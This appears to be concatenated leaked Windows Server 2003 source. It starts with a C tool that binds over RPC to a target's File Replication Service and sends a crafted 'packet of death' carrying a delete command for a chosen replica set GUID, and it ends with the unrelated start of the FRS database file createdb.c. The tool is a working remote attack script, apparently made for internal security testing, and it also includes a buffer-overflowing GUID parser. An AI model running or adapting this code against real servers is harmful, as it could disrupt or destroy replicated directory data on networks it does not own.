    s - The input character buffer in display guid format.
        e.g.:  b81b486b-c338-11d0-ba4f0000f80007df

        Must be at least GUID_CHAR_LEN (35 bytes) long.

Function Return Value:

    None.

--*/
{
    UCHAR   Guid[sizeof(GUID) + sizeof(DWORD)]; // 3 byte overflow
    GUID    *lGuid = (GUID *)Guid;


    sscanf(s, "%08lx-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x",
           &lGuid->Data1,
           &lGuid->Data2,
           &lGuid->Data3,
           &lGuid->Data4[0],
           &lGuid->Data4[1],
           &lGuid->Data4[2],
           &lGuid->Data4[3],
           &lGuid->Data4[4],
           &lGuid->Data4[5],
           &lGuid->Data4[6],
           &lGuid->Data4[7]);
    COPY_GUID(pGuid, lGuid);
}



VOID*
MALLOC(size_t x) {
   VOID* _x; 
   _x = malloc(x); 
   if(_x == NULL){ 
      printf("Out of memory!!\n\n");
      exit(1); 
   } 
       
   ZeroMemory(_x, x);
   return(_x);
}



PVOID
MIDL_user_allocate(
    IN size_t Bytes
    )
/*++
Routine Description:
    Allocate memory for RPC.

Arguments:
    Bytes   - Number of bytes to allocate.

Return Value:
    NULL    - memory could not be allocated.
    !NULL   - address of allocated memory.
--*/
{
    return MALLOC(Bytes);
}



VOID
MIDL_user_free(
    IN PVOID Buffer
    )
/*++
Routine Description:
    Free memory for RPC.

Arguments:
    Buffer  - Address of memory allocated with MIDL_user_allocate().

Return Value:
    None.
--*/
{
    FREE(Buffer);
}


BindWithAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
/*++
Routine Description:
    Bind to the NtFrs service on ComputerName (this machine if NULL)
    with authenticated, encrypted packets.

Arguments:
    ComputerName     - Bind to the service on this computer. The computer
                       name can be any RPC-bindable name. Usually, the
                       NetBIOS or DNS name works just fine. The NetBIOS
                       name can be found with GetComputerName() or
                       hostname. The DNS name can be found with
                       gethostbyname() or ipconfig /all. If NULL, the
                       service on this computer is contacted. The service
                       is contacted using Secure RPC.
    OutHandle        - Bound, resolved, authenticated handle

Return Value:
    Win32 Status
--*/
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
        //
        // Return value
        //
        *OutHandle = NULL;

        //
        // If needed, get computer name
        //
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

        //
        // Create a binding string to NtFrs on some machine.  
        WStatus = RpcStringBindingCompose(NULL, PROTSEQ_TCP_IP, ComputerName,
                                          NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
        //
        // Store the binding in the handle
        //
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
        //
        // Resolve the binding to the dynamic endpoint
        //
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

        //
        // Find the principle name
        //
        WStatus = RpcMgmtInqServerPrincName(Handle, RPC_C_AUTHN_GSS_NEGOTIATE, &PrincName);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
        //
        // Set authentication info
        //
        WStatus = RpcBindingSetAuthInfo(Handle,
                                        PrincName,
                                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                        RPC_C_AUTHN_GSS_NEGOTIATE,
                                        NULL,
                                        RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



        //
        // SUCCESS
        //
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
        WStatus = GetExceptionCode();
    }

    //
    // Clean up any handles, events, memory, ...
    //
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
	WStatus1 = GetExceptionCode();


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}



BindWithNamedPipeNoAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
/*++
Routine Description:
    Bind to the NtFrs service on ComputerName (this machine if NULL)
    with authenticated, encrypted packets.

Arguments:
    ComputerName     - Bind to the service on this computer. The computer
                       name can be any RPC-bindable name. Usually, the
                       NetBIOS or DNS name works just fine. The NetBIOS
                       name can be found with GetComputerName() or
                       hostname. The DNS name can be found with
                       gethostbyname() or ipconfig /all. If NULL, the
                       service on this computer is contacted. The service
                       is contacted using Secure RPC.
    OutHandle        - Bound, resolved, authenticated handle

Return Value:
    Win32 Status
--*/
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
        //
        // Return value
        //
        *OutHandle = NULL;

        //
        // If needed, get computer name
        //
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

        //
        // Create a binding string to NtFrs on some machine.  
	WStatus = RpcStringBindingCompose(NULL, PROTSEQ_NAMED_PIPE, ComputerName,
					   NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
        //
        // Store the binding in the handle
        //
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
        //
        // Resolve the binding to the dynamic endpoint
        //
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

        //
        // Set authentication info
        //

	WStatus = RpcBindingSetAuthInfo(Handle,
				NULL,
				RPC_C_AUTHN_LEVEL_NONE,
				RPC_C_AUTHN_NONE,
				NULL,
				RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



        //
        // SUCCESS
        //
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
        WStatus = GetExceptionCode();
    }

    //
    // Clean up any handles, events, memory, ...
    //
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
	WStatus1 = GetExceptionCode();


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}

BindWithNoAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
/*++
Routine Description:
    Bind to the NtFrs service on ComputerName (this machine if NULL)
    with authenticated, encrypted packets.

Arguments:
    ComputerName     - Bind to the service on this computer. The computer
                       name can be any RPC-bindable name. Usually, the
                       NetBIOS or DNS name works just fine. The NetBIOS
                       name can be found with GetComputerName() or
                       hostname. The DNS name can be found with
                       gethostbyname() or ipconfig /all. If NULL, the
                       service on this computer is contacted. The service
                       is contacted using Secure RPC.
    OutHandle        - Bound, resolved, authenticated handle

Return Value:
    Win32 Status
--*/
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
        //
        // Return value
        //
        *OutHandle = NULL;

        //
        // If needed, get computer name
        //
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

        //
        // Create a binding string to NtFrs on some machine.  
	WStatus = RpcStringBindingCompose(NULL, PROTSEQ_TCP_IP, ComputerName,
					   NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
        //
        // Store the binding in the handle
        //
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
        //
        // Resolve the binding to the dynamic endpoint
        //
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

        //
        // Set authentication info
        //

	WStatus = RpcBindingSetAuthInfo(Handle,
				NULL,
				RPC_C_AUTHN_LEVEL_NONE,
				RPC_C_AUTHN_NONE,
				NULL,
				RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



        //
        // SUCCESS
        //
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
        WStatus = GetExceptionCode();
    }

    //
    // Clean up any handles, events, memory, ...
    //
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
	WStatus1 = GetExceptionCode();


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}


// 
// Contruct the packet that we will send
//
DWORD
BuildPacketOfDeath(
    VOID **ppPacket,
    char* TargetGuid
    )
{
    PCOMM_PACKET CommPkt = NULL;
    COMM_PKT_DESCRIPTOR BoP;
    COMM_PKT_DESCRIPTOR Pkt1, Pkt2, Pkt3, Pkt4, Pkt5, Pkt6;
    COMM_PKT_DESCRIPTOR EoP;
    ULONG Zero = 0;
    ULONG NullData = COMM_NULL_DATA;
    GUID Guid;
    ULONG   Len;
    ULONG   LenGuid;
    ULONG   LenName;
    GNAME GName;
    PBYTE ReplicaData = NULL;
    PBYTE CopyTo = NULL;
    PVOID CopyFrom = NULL;
    ULONG CopyLen = 0;
    ULONG CmdDelete = CMD_DELETE;

    BoP.CommType = COMM_BOP;
    BoP.CommDataLength = sizeof(ULONG);
    BoP.ActualDataLength = sizeof(ULONG);
    BoP.Data = &Zero;
    BoP.Next = &Pkt2;

    Pkt2.CommType = COMM_COMMAND;
    Pkt2.CommDataLength = sizeof(ULONG);
    Pkt2.ActualDataLength = sizeof(ULONG);
    Pkt2.Data = &CmdDelete;
    Pkt2.Next = &Pkt1;

    GName.Guid = &Guid;
    
    StrToGuid(TargetGuid, GName.Guid);
    GName.Name = L"Fake Name";
    
    LenGuid = sizeof(GUID);
    LenName = (wcslen(GName.Name) + 1) * sizeof(WCHAR);
    Len = LenGuid + LenName + (2 * sizeof(ULONG));

    ReplicaData = MALLOC(sizeof(ULONG) +  // Len
			 sizeof(ULONG) +  // LenGuid
			 LenGuid +        // GName.Guid
			 sizeof(ULONG) +  // LenName
			 LenName          // GName.Name
			 );

    CopyTo = ReplicaData;
    
    CopyFrom = &LenGuid;
    CopyLen = sizeof(ULONG);
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = GName.Guid;
    CopyLen = LenGuid;
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = &LenName;
    CopyLen = sizeof(ULONG);
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = GName.Name;
    CopyLen = LenName;
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;


    Pkt1.CommType = COMM_REPLICA;
    Pkt1.CommDataLength = sizeof(USHORT);
    Pkt1.ActualDataLength = Len;
    Pkt1.Data = ReplicaData;
    Pkt1.Next = &EoP;


    EoP.CommType = COMM_EOP;
    EoP.CommDataLength = sizeof(ULONG);
    EoP.ActualDataLength = sizeof(ULONG);
    EoP.Data = &NullData;
    EoP.Next = NULL;


    *ppPacket = BuildCommPktFromDescriptorList(&BoP,
					     COMM_MEM_SIZE,
					     NULL,
					     NULL,
					     NULL,
					     NULL,
					     NULL,
					     NULL
					     );


    return ERROR_SUCCESS;
}

DWORD
MakeRpcCall(
    handle_t Handle,
    VOID* pPacket
    )
{
    DWORD WStatus = ERROR_SUCCESS;

    try{
	WStatus = FrsRpcSendCommPkt(Handle, pPacket);
    } except(EXCEPTION_EXECUTE_HANDLER) {
	WStatus = GetExceptionCode();
    }

    return WStatus;
}


void
Usage(
    void
    )
{
    printf("\nUsage:\n\n");
    printf("%ws ReplicaSetGuid [TargetComputer]\n\n\n", ProgramName);

}

__cdecl 
main(
    int argc,
    char** Argv
    )
{

    WCHAR* ComputerName = NULL;
    handle_t Handle;
    DWORD WStatus = ERROR_SUCCESS;
    VOID *pPacket = NULL;

    ProgramName = (WCHAR*) malloc((strlen(Argv[0]) + 1) * sizeof(WCHAR));
    wsprintf(ProgramName,L"%S",Argv[0]);
    if((argc > 3) || (argc < 2)) {
	Usage();
	exit(1);
    }

    if(strlen(Argv[1]) != 35) {
	printf("\nIncorrect guid format!\n\n");
	exit(1);
    }

    // A computer was name supplied
    if(argc == 3) {
	ComputerName = (WCHAR*) malloc((strlen(Argv[2]) + 1) * sizeof(WCHAR));
	wsprintf(ComputerName,L"%S", Argv[2]);
    }


    printf("Computer name = %ws\n", ComputerName);

    WStatus = BindWithAuth(ComputerName, &Handle);

    if(!WIN_SUCCESS(WStatus)){
	printf("Error binding: %d\n",WStatus);
	exit(1);
    } else {
	printf("Bind succeeded!\n");
    }

    WStatus = BuildPacketOfDeath(&pPacket, Argv[1]);

    if(!WIN_SUCCESS(WStatus)) {
	printf("Error building packet: %d\n",WStatus);
	exit(1);
    } else {
	printf("Packet built!\n");
    }

    WStatus = MakeRpcCall(Handle, pPacket);

    printf("Result of RPC call: %d (0x%08x)\n",WStatus, WStatus);


}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\repl\createdb.c ===
/*++

Copyright (c) 1997-1999 Microsoft Corporation

Module Name:

    CreateDB.c

Abstract:

    Generate the JET DATABASE Structure for the NT File Replication Service.

Author:

    David Orbits (davidor) - 3-Mar-1997

Revision History:

--*/

#include <ntreppch.h>
#pragma  hdrstop

#include <frs.h>
#include <tablefcn.h>
#include <genhash.h>
#include <test.h>
#include <perrepsr.h>
#include <ntfrsapi.h>
#include <info.h>


#pragma warning( disable:4102)  // unreferenced label


#define UPDATE_RETRY_COUNT 10

#define MAX_CMD_LINE 1024

PFRS_THREAD         MonitorThread;

//
// Directory and file filter lists from registry.
//
extern PWCHAR   RegistryFileExclFilterList;
extern PWCHAR   RegistryFileInclFilterList;

extern PWCHAR   RegistryDirExclFilterList;
extern PWCHAR   RegistryDirInclFilterList;

//
// Global Jet Instance handle
//
JET_INSTANCE  GJetInstance = JET_instanceNil;

//
// The FRS global init record '<init>' is loaded into a fake (i.e. no really
// a replica) structure for convenience.
//
PREPLICA FrsInitReplica;

#define INITIAL_BINARY_FIELD_ALLOCATION 256

//
// The list of all Replica Structs active, stopped and faulted.
//
FRS_QUEUE ReplicaListHead;
FRS_QUEUE ReplicaStoppedListHead;
FRS_QUEUE ReplicaFaultListHead;


PFRS_QUEUE AllReplicaLists[] = {&ReplicaListHead,
                                &ReplicaStoppedListHead,
                                &ReplicaFaultListHead};

typedef struct _CO_RETIRE_DECISION_TABLE {
    ULONG   RetireFlag;
    BYTE    ConditionTest[9];
    BYTE    Fill[3];
    ULONG   DontCareMask;
    ULONG   ConditionMatch;
} CO_RETIRE_DECISION_TABLE, *PCO_RETIRE_DECISION_TABLE;


//                    Change Order Retire Decision Table
//
// This table summarizes the cleanup actions for a retiring change order.
// Each row describes the conditions under which the cleanup action specified
// in column 1 is to be performed.  The remaining columns describe the
// specific individual conditions that must be present for the given action to
// be selected.
//
// A blank column (value of zero) means the related condition is a don't care.
// Otherwise the value in the column must match the 0 or 1 state of the given condition.
// A column value of one implies a condition test of 1 (or True).
// A column value of non-zero and non-one implies a condition test of 0 (or False).
//

#define  tRemote   2      // condition state is (0) remote CO
#define  tLocal    1      // condition state is (1) local CO
#define  tAbort    1      // condition state is (1) abort CO
#define  tNotAbort 2      // condition state is (0) no abort CO
#define  tYES      1      // condition state is 1 (or true)
#define  tNO       2      // condition state is 0 (or false)
#define  __        0      // don't care

CO_RETIRE_DECISION_TABLE CoRetireDecisionTable[] = {
//
//                          <8>        <7>         <6>     <5>    <4>    <3>    <2>   <1>     <0>
//Cleanup Action           Local /   Retire/       VV       VV   Refresh  Retry Just  CO     Valid
//ISCU_<flag>              Remote    Abort      activated  EXEC     CO     CO   OID   New    DIR
//                                                                              Reset File   Child

{ISCU_ACTIVATE_VV        , tRemote , __          ,tNO     ,__    ,__    ,__    ,__    ,__    ,__    },//
{ISCU_ACTIVATE_VV        , tLocal  , tNotAbort   ,tNO     ,__    ,__    ,__    ,__    ,__    ,__    },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_ACTIVATE_VV_DISCARD, tRemote , tAbort      ,__      ,tNO   ,__    ,__    ,__    ,__    ,__    },//
{ISCU_ACTIVATE_VV_DISCARD, tLocal  , tAbort      ,__      ,__    ,__    ,__    ,__    ,__    ,__    },//
//-----------------------,---------,-----  ------,--------,------,------,------,------,------,----------------
{ISCU_DEL_STAGE_FILE     , tRemote ,__           ,tNO     ,__    ,tYES  ,__    ,__    ,__    ,__    },//
{ISCU_DEL_STAGE_FILE     , tRemote , tAbort      ,__      ,tNO   ,__    ,__    ,__    ,__    ,__    },//
{ISCU_DEL_STAGE_FILE     , tLocal  , tAbort      ,__      ,__    ,__    ,__    ,__    ,__    ,__    },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_DEL_STAGE_FILE_IF  , tRemote ,__           ,__      ,__    ,__    ,__    ,__    ,__    ,__    },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_DEL_PREINSTALL     , tRemote , tAbort      ,__      ,tNO   ,__    ,__    ,__    ,__    ,__    },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_CO_ABORT           , tRemote , tAbort      ,__      ,tYES  ,__    ,__    ,__    ,__    ,__    },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_ACK_INBOUND        , tRemote ,__           ,tNO     ,__    ,__    ,__    ,__    ,__    ,__    },//
{ISCU_ACK_INBOUND        , tRemote ,__           ,tYES    ,__    ,__    ,tYES  ,__    ,__    ,__    },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_INS_OUTLOG         , tLocal  , tNotAbort   ,__      ,__    ,__   ,__    ,tNO   ,__    ,__    },//
{ISCU_INS_OUTLOG         , tRemote , tNotAbort   ,tNO     ,__    ,__   ,__    ,__    ,__    ,__    },//
{ISCU_INS_OUTLOG         , tRemote , tNotAbort   ,tYES    ,__    ,__   ,tYES  ,__    ,__    ,__    },//
{ISCU_INS_OUTLOG         , tRemote , tAbort      ,tNO     ,__    ,__   ,__    ,__    ,__    ,tYES  },//
{ISCU_INS_OUTLOG         , tRemote , tAbort      ,tYES    ,__    ,__   ,tYES  ,__    ,__    ,tYES  },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_INS_OUTLOG_NEW_GUID, tRemote , tNotAbort   ,tYES    ,__    ,__   ,tYES  ,__    ,__    ,__    },//
{ISCU_INS_OUTLOG_NEW_GUID, tRemote , tAbort      ,tYES    ,__    ,__   ,tYES  ,__    ,__    ,tYES  },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_UPDATE_IDT_ENTRY   , tRemote , tNotAbort   ,__      ,__    ,__    ,__    ,__    ,__    ,__    },//
{ISCU_UPDATE_IDT_ENTRY   , tLocal  , tNotAbort   ,__      ,__    ,__    ,__    ,tNO   ,__    ,__    },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_UPDATE_IDT_FILEUSN , tLocal  , tNotAbort   ,__      ,__    ,__    ,__    ,tYES  ,__    ,__    },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_UPDATE_IDT_VERSION ,__       ,__           ,__      ,__    ,__    ,__    ,__    ,__    ,tYES  },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{ISCU_DEL_IDT_ENTRY      ,__       , tAbort      ,__      ,__    ,__    ,__    ,__    , tYES ,      },//
//-----------------------,---------,-------------,--------,------,------,------,------,------,-----------------
{     0                  ,__       ,__           ,__      ,__    ,__    ,__    ,__    ,__    ,__    } //
};


//
// Tables from active replicas from replica.c. Used in DbsProcessReplicaFaultList.
//
extern PGEN_TABLE ReplicasByGuid;
extern PGEN_TABLE ReplicasByNumber;


//
// DbsInitOneReplicaSet serialization lock.
//
CRITICAL_SECTION DbsInitLock;

#define ACQUIRE_DBS_INIT_LOCK  EnterCriticalSection(&DbsInitLock)
#define RELEASE_DBS_INIT_LOCK  LeaveCriticalSection(&DbsInitLock)
#define INITIALIZE_DBS_INIT_LOCK INITIALIZE_CRITICAL_SECTION(&DbsInitLock);

//
// The DB Service process queue holds command request packets.
//
COMMAND_SERVER DBServiceCmdServer;
#define DBSERVICE_MAX_THREADS 1


extern FRS_QUEUE        VolumeMonitorStopQueue;
extern FRS_QUEUE        VolumeMonitorQueue;
extern CRITICAL_SECTION JrnlReplicaStateLock;
extern ULONGLONG        ReplicaTombstoneInFileTime;

extern DWORD            StagingAreaAllocated;
extern ULONG            MaxNumberReplicaSets;
extern ULONG            MaxNumberJetSessions;
extern ULONG            MaxOutLogCoQuota;

ULONG  OpenDatabases = 0;
BOOL  FrsDbNeedShutdown = FALSE;
ULONG FrsMaxReplicaNumberUsed = DBS_FIRST_REPLICA_NUMBER - 1;
BOOL  DBSEmptyDatabase = FALSE;

PCHAR ServiceStateNames[CNF_SERVICE_STATE_MAX];
PCHAR CxtionStateNames[CXTION_MAX_STATE];



//
// Replica set config record Flags.
//
FLAG_NAME_TABLE ConfigFlagNameTable[] = {

    {CONFIG_FLAG_MULTIMASTER   , "Multimaster " },
    {CONFIG_FLAG_MASTER        , "Master "      },
    {CONFIG_FLAG_PRIMARY       , "Primary "     },
    {CONFIG_FLAG_SEEDING       , "Seeding "     },
    {CONFIG_FLAG_ONLINE        , "Online "     },
    {CONFIG_FLAG_PRIMARY_UNDEFINED       , "PrimaryUndefined "     },


    {0, NULL}
};


//
// The following config record fields are updated when a replica set is closed.
//
ULONG CnfCloseFieldList[] = {LastShutdownx, ServiceStatex};
#define CnfCloseFieldCount  (sizeof(CnfCloseFieldList) / sizeof(ULONG))

//
// The following config record fields are saved periodically for recovery.
//
ULONG CnfMarkPointFieldList[] = {FSVolLastUSNx, FrsVsnx};
#define CnfMarkPointFieldCount  (sizeof(CnfMarkPointFieldList) / sizeof(ULONG))

//
// The following config record stat fields are saved periodically.
//
ULONG CnfStatFieldList[] = {PerfStatsx};
#define CnfStatFieldCount  (sizeof(CnfStatFieldList) / sizeof(ULONG))


extern ULONGLONG MaxPartnerClockSkew;

extern JET_SYSTEM_PARAMS JetSystemParamsDef;


extern PCHAR CoLocationNames[];

//
// Jet paths
//
PWCHAR  JetFile;
PWCHAR  JetFileCompact;
PCHAR   JetPathA;
PCHAR   JetFileA;
PCHAR   JetFileCompactA;
PCHAR   JetSysA;
PCHAR   JetTempA;
PCHAR   JetLogA;


//
// Increase the maximum number of open tables that Jet will allow.
//
// Note that this param is not actually the maximum number of open tables,
// it's the maximum number of open tables AND open indexes AND open
// long value trees.  So if a given table has 3 secondary indexes and a
// long value tree, it will actually use 5 of these resources when opened.
// The default setting for this param is 300.  [Jonathan Liem]
//
// To compute this we get the value for the max number of replica sets from
// the registry and mulitply it by NUMBER_JET_TABLES_PER_REPLICA_SET.

#define  NUMBER_JET_TABLES_PER_REPLICA_SET  10




typedef struct _PREEXISTING {
    PWCHAR  RootPath;
    PWCHAR  PreExistingPath;
    BOOL    MovedAFile;
} PREEXISTING, *PPREEXISTING;


//
// DEBUG OPTION: cause real out of space errors
//
#if DBG
#define DBG_DBS_OUT_OF_SPACE_FILL(_op_) \
{ \
    if (DebugInfo.DbsOutOfSpace == _op_) { \
        DWORD  \
        FrsFillDisk( \
            IN PWCHAR   DirectoryName, \
            IN BOOL     Cleanup \
            ); \
        FrsFillDisk(JetPath, FALSE); \
    } \
}
#define DBG_DBS_OUT_OF_SPACE_EMPTY(_op_) \
{ \
    if (DebugInfo.DbsOutOfSpace == _op_) { \
        DWORD  \
        FrsFillDisk( \
            IN PWCHAR   DirectoryName, \
            IN BOOL     Cleanup \
            ); \
        FrsFillDisk(JetPath, TRUE); \
    } \
}
#define DBG_DBS_OUT_OF_SPACE_TRIGGER(_jerr_) \
{ \
    if (DebugInfo.DbsOutOfSpaceTrigger &&  \
        --DebugInfo.DbsOutOfSpaceTrigger == 0) { \
        DPRINT(0, "DBG - Trigger an out-of-space error\n"); \
        _jerr_ = JET_errDiskFull; \
    } \
}
#else DBG
#define DBG_DBS_OUT_OF_SPACE_FILL(_op_)
#define DBG_DBS_OUT_OF_SPACE_EMPTY(_op_)
#define DBG_DBS_OUT_OF_SPACE_TRIGGER(_jerr_)
#endif DBG

//
// The following macro tests if a database record field is a pointer to
// the actual data v.s. the data itself.  If the field size in the record
// equals sizeof(PVOID) and is less than the max data width defined in the
// column definition struct then the field is a pointer to data.
//
#define FIELD_IS_PTR(_FieldSize_, _ColMax_)  \
    (((_FieldSize_) < (_ColMax_)) && ((_FieldSize_) == sizeof(PVOID)))


#define DEFAULT_TOMBSTONE_LIFE 60
ULONG ParamTombstoneLife=DEFAULT_TOMBSTONE_LIFE;

//
// This indicates that the staging recovery is complete. Used to ignore any attempts
// to cleanup staging space during recovery.
//
BOOL StagingRecoveryComplete;


BOOL
FrsIsDiskWriteCacheEnabled(
    IN PWCHAR Path
    );

ULONG
DbsPackIntoConfigRecordBlobs(
    IN  PREPLICA    Replica,
    IN  PTABLE_CTX  TableCtx
);

ULONG
DbsUnPackFromConfigRecordBlobs(
    IN PREPLICA Replica,
    IN PTABLE_CTX TableCtx
    );

ULONG
OutLogRemoveReplica(
    PTHREAD_CTX  ThreadCtx,
    PREPLICA     Replica
);

JET_ERR
DbsSetupReplicaStateWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
    );

ULONG
DbsOpenReplicaSet (
    IN PTHREAD_CTX  ThreadCtx,
    IN OUT PREPLICA Replica
    );

ULONG
DbsProcessReplicaFaultList(
    PDWORD  pReplicaSetsDeleted
    );

ULONG
DbsLoadReplicaFileTree(
    PTHREAD_CTX ThreadCtx,
    PREPLICA Replica,
    PREPLICA_THREAD_CTX RtCtx,
    LPTSTR RootPath
    );

DWORD
DbsDBInitialize (
    PTHREAD_CTX   ThreadCtx,
    PBOOL         EmptyDatabase
    );

DWORD
WINAPI
DBService(
    LPVOID ThreadContext
    );

ULONG
DbsUpdateConfigTable(
    IN PTHREAD_CTX ThreadCtx,
